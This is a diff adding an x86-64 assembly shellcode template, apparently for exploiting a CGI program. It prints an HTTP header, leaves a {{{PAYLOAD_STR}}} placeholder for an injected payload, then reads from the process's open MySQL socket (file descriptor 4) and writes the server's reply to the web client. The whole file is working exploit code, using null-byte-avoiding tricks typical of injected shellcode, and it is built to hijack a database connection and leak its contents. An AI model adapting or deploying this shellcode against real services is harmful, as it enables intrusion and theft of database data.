@@ -1,0 +1,88 @@
+.intel_syntax noprefix
+//    xor rax, rax
+//    mov al, 102         #syscall get uid
+//    syscall
+
+	push rbp
+	mov rbp, rsp
+
+	// syscall 1 (sys_write)
+	xor rax, rax
+	mov al, 1
+
+	// fd 1 (stdout)
+	xor rdi, rdi
+	mov rdi, rax
+
+    // &string into rsi
+    xor rdx, rdx
+	push rdx
+	// "Content-type:    text/html\n\n\n\n\n\n" is what we need to output first
+	mov rcx, 0x0a0a0a0a0a0a6c6d
+	push rcx
+	mov rcx, 0x74682f7478657420
+	push rcx
+	mov rcx, 0x2020203a65707974
+	push rcx
+	mov rcx, 0x2d746e65746e6f43
+	push rcx
+
+	mov rsi, rsp
+
+	// count
+	mov dl, 32
+	syscall
+
+{{{PAYLOAD_STR}}}
+
+	// read from the mysql server
+
+	xor rax, rax
+	mov al, 0xff
+    shl rax, 5
+
+	// create some space on the stack
+	sub rsp, rax
+
+	// syscall 0 (read)
+	xor rax, rax
+
+	// fd 4 (mysql)
+	xor rdi, rdi
+	inc rdi
+	inc rdi
+	inc rdi
+	inc rdi
+
+	// %buf (sp)
+	mov rsi, rsp
+
+	// size
+	xor rdx, rdx
+	mov dl, 0xff
+	shl rdx, 5
+
+	syscall
+
+
+	// write out what the mysql server sent us!
+
+	// num bytes returned from the read is what we want to write
+	mov rdx, rax
+
+	// syscall 1 (write)
+	xor rax, rax
+	mov al, 1
+
+	// fd 1 (stdout)
+	xor rdi, rdi
+	mov rdi, rax
+
+	// %buf (sp)
+	mov rsi, rsp
+
+	syscall
+
+	leave
+	ret
+
